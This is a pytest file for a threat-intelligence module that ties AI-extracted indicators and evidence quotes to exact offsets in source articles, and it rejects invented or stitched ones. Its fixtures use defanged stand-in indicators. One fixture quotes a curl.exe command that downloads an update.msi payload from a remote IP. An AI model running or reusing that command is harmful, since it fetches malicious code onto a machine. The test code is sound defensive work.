# "Nothing clears up a case so much as stating it to another person." — Sherlock Holmes
"""Anchoring: what it locates, and — mostly — what it refuses.

The defang forms below are the ones that actually appear in the corpus we
ingest (`1.2.3[.]4`, `hxxps://`, `admin[at]`), not a survey of everything a
defanger could emit. The refusal cases matter more than the matches: an anchor
that quietly lands on the wrong text is worse than no anchor at all, because it
turns a hallucinated indicator into evidence with an offset.
"""

import pytest

from pestilentia.ai.extraction.anchors import (
    AnchorIndex,
    anchor,
    anchor_quote,
    refang,
)

# --- what anchors ------------------------------------------------------------


def test_plain_value_anchors_at_its_offsets():
    body = "The dropper contacted 203.0.113.7 over port 443."
    found = anchor(body, "203.0.113.7")

    assert found is not None
    assert body[found.start : found.end] == "203.0.113.7"
    assert found.text == "203.0.113.7"


@pytest.mark.parametrize(
    "written",
    ["203.0.113[.]7", "203.0.113(.)7", "203.0.113{.}7", "203.0.113[dot]7", "203.0.113[ . ]7"],
)
def test_defanged_body_anchors_to_the_clean_value(written):
    """The model returns the canonical form; the article carries the defanged
    one. Refusing here would reject exactly the indicators analysts write."""
    body = f"C2 at {written} was still live."
    found = anchor(body, "203.0.113.7")

    assert found is not None
    assert found.text == written


def test_anchor_text_is_the_article_wording_not_the_clean_value():
    """`Anchor.text` is what gets stored as `value_defanged`, so it has to be
    the body's own characters — brackets and all."""
    body = "Payload staged on hxxps://evil[.]example[.]com/a.bin"
    found = anchor(body, "https://evil.example.com/a.bin")

    assert found is not None
    assert found.text == "hxxps://evil[.]example[.]com/a.bin"


def test_defanged_email_anchors():
    body = "Contact for the decryptor: support[at]evil[.]com."
    found = anchor(body, "support@evil.com")

    assert found is not None
    assert found.text == "support[at]evil[.]com"


def test_defanged_scheme_alone_anchors():
    body = "See hxxp://198.51.100.9/gate.php for the panel."
    found = anchor(body, "http://198.51.100.9/gate.php")

    assert found is not None
    assert found.text == "hxxp://198.51.100.9/gate.php"


def test_uppercase_hash_anchors_to_a_lowercase_value():
    """Reports print hashes both ways; the model canonicalises to lowercase."""
    digest = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    body = f"SHA-256: {digest.upper()}"
    found = anchor(body, digest)

    assert found is not None
    assert found.text == digest.upper()


def test_zero_width_characters_do_not_hide_an_indicator():
    body = "beacon at 198.51.100​.9 in the sample"
    found = anchor(body, "198.51.100.9")

    assert found is not None
    assert found.text == "198.51.100​.9"


def test_candidates_are_tried_in_order_and_the_first_hit_wins():
    """Callers pass `value_as_written` first, then the canonical value."""
    body = "The domain evil[.]com resolved to 203.0.113.7."
    found = anchor(body, "evil[.]com", "evil.com")

    assert found is not None
    assert found.text == "evil[.]com"


def test_a_candidate_that_misses_falls_through_to_the_next():
    body = "The domain evil.com resolved to 203.0.113.7."
    found = anchor(body, "evil[.]com", "evil.com")

    assert found is not None
    assert found.text == "evil.com"


def test_first_occurrence_is_the_anchor():
    body = "evil.com appeared twice; evil.com again."
    found = anchor(body, "evil.com")

    assert found is not None
    assert found.start == 0


# --- what it refuses ---------------------------------------------------------


def test_a_value_absent_from_the_body_is_refused():
    """The whole point of the module: no span, no indicator."""
    body = "The dropper contacted 203.0.113.7 over port 443."

    assert anchor(body, "198.51.100.9") is None


def test_an_ip_inside_a_longer_ip_is_refused():
    """`1.2.3.4` occurs inside `11.2.3.42` — a different address entirely."""
    assert anchor("traffic to 11.2.3.42 was observed", "1.2.3.4") is None


def test_a_domain_inside_a_subdomain_is_refused():
    """The article listed `mail.example.com`; `example.com` is the model's own
    invention and must not borrow that span."""
    assert anchor("beacon to mail.example.com every hour", "example.com") is None


def test_a_domain_carrying_a_longer_suffix_is_refused():
    """`example.com` is not `example.com.br`."""
    assert anchor("registered under example.com.br last week", "example.com") is None


def test_an_indicator_that_ends_a_sentence_still_anchors():
    """The commonest position of all: a trailing full stop is punctuation, not
    another label of the domain."""
    found = anchor("Mail went to support[at]evil[.]com.", "support@evil.com")

    assert found is not None
    assert found.text == "support[at]evil[.]com"


def test_a_hash_inside_a_longer_hash_is_refused():
    sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    body = f"SHA-256: {sha1}0011223344556677889900112233445566778899"

    assert anchor(body, sha1) is None


def test_a_domain_inside_a_url_still_anchors():
    """`/` and `:` do not continue an indicator, so a domain quoted out of a
    URL is genuinely present in the text."""
    found = anchor("fetched from https://evil.com/a.bin", "evil.com")

    assert found is not None
    assert found.text == "evil.com"


def test_an_empty_or_blank_candidate_is_refused():
    body = "The dropper contacted 203.0.113.7 over port 443."

    assert anchor(body, "") is None
    assert anchor(body, "   ") is None
    assert anchor(body) is None


def test_an_empty_body_anchors_nothing():
    assert anchor("", "203.0.113.7") is None


# --- evidence quotes ---------------------------------------------------------


def test_a_quote_anchors_across_the_article_line_breaks():
    body = "The operators deployed\n   Mimikatz on the domain controller."
    found = anchor_quote(body, "deployed Mimikatz on the domain controller")

    assert found is not None
    assert found.text == "deployed\n   Mimikatz on the domain controller"


def test_a_quote_anchors_without_the_full_stop_that_closes_it():
    """A model quoting a sentence rarely brings the punctuation along; for
    prose that is not evidence of a fabricated quote."""
    body = "The operators deployed Mimikatz on the host."
    found = anchor_quote(body, "deployed Mimikatz on the host")

    assert found is not None
    assert found.text == "deployed Mimikatz on the host"


def test_a_quote_survives_curly_punctuation():
    body = "The group\u2019s tooling \u2014 largely commodity \u2014 was unchanged."
    found = anchor_quote(body, "The group's tooling - largely commodity - was unchanged")

    assert found is not None
    assert found.start == 0


def test_a_quote_starting_mid_word_is_refused():
    assert anchor_quote("They deployed Mimikatz.", "ployed Mimikatz") is None


def test_an_invented_quote_is_refused():
    body = "The operators deployed Mimikatz on the host."

    assert anchor_quote(body, "the operators exfiltrated 4 TB of data") is None


# --- what a quotation is allowed to change -----------------------------------
#
# Every rule below was measured on stored rows before it was written. Four of
# 203 diamond vertices were verbatim quotations refused over a quotation mark,
# one over an ellipsis, one over a list marker. A ruler that refuses correct
# work teaches the reader to ignore it, which costs more than the six.


def test_a_quotation_mark_is_not_part_of_the_sentence():
    """The article wrote it one way and the model quoted it the other."""
    body = 'The tool we track as "Starland RAT." was dropped next.'

    assert anchor_quote(body, "The tool we track as 'Starland RAT.'") is not None


def test_an_elision_is_a_quotation_and_not_a_fabrication():
    body = (
        "The malware queries public Polygon RPC endpoints (no wallet required) "
        "to obtain the proxy server address. The malware stores configuration "
        "data on the Polygon blockchain."
    )

    found = anchor_quote(body, "public Polygon RPC endpoints ... stores configuration data")

    assert found is not None
    assert found.text.startswith("public Polygon RPC endpoints")
    assert found.text.endswith("stores configuration data")


def test_an_elision_cannot_be_used_to_run_the_article_backwards():
    """Order is the whole difference between quoting and rearranging."""
    body = "First the loader ran. Then the locker encrypted the estate."

    assert anchor_quote(body, "the locker encrypted the estate ... First the loader ran") is None


def test_two_distant_fragments_joined_into_one_sentence_are_refused():
    """The worst shape the measurement found: both halves true, the claim not.

    A vertex quoted a sentence and continued with a command line from further
    down the article, asserting as one statement something the article never
    put together. No elision marks it, so nothing licenses the jump.
    """
    body = (
        "It writes the file to a directory on the victim machine, then executes it. "
        "Although port 443 is specified, the traffic is plain HTTP. "
        "curl.exe http://172.86.126.18:443/update.msi -o C:\\programdata\\update.msi"
    )
    stitched = "then executes it. curl.exe http://172.86.126.18:443/update.msi"

    assert anchor_quote(body, stitched) is None


def test_a_list_marker_the_model_leaves_out_does_not_break_the_quote():
    body = "The affected products are:\n- C-CURE 9000 <=v3.10.1\n- Victor Application Server"

    assert anchor_quote(body, "The affected products are: C-CURE 9000 <=v3.10.1") is not None


def test_a_hyphen_inside_a_word_is_still_a_hyphen():
    """The list-marker rule reads layout, and must not reach into words."""
    body = "The actor used a well-known loader."

    assert anchor_quote(body, "a well-known loader") is not None
    assert anchor_quote(body, "a well known loader") is None


# --- refang ------------------------------------------------------------------


def test_refang_preserves_case():
    """A base58 address and a URL path are case-sensitive: canonicalising must
    not lowercase them."""
    address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

    assert refang(address) == address
    assert refang("hxxps://Evil[.]com/Path?A=1") == "https://Evil.com/Path?A=1"


def test_refang_leaves_a_clean_value_untouched():
    assert refang("203.0.113.7") == "203.0.113.7"


def test_refang_handles_escaped_dots_and_invisible_characters():
    assert refang("evil\\.com") == "evil.com"
    assert refang("evil​.com") == "evil.com"


# --- the reusable index ------------------------------------------------------


def test_one_index_serves_many_lookups():
    body = "IOCs: 203.0.113.7, evil[.]com, and hxxps://evil[.]com/a.bin"
    index = AnchorIndex(body)

    assert index.body == body
    assert index.find("203.0.113.7") is not None
    assert index.find("evil.com") is not None
    assert index.find("https://evil.com/a.bin") is not None
    assert index.find("198.51.100.9") is None
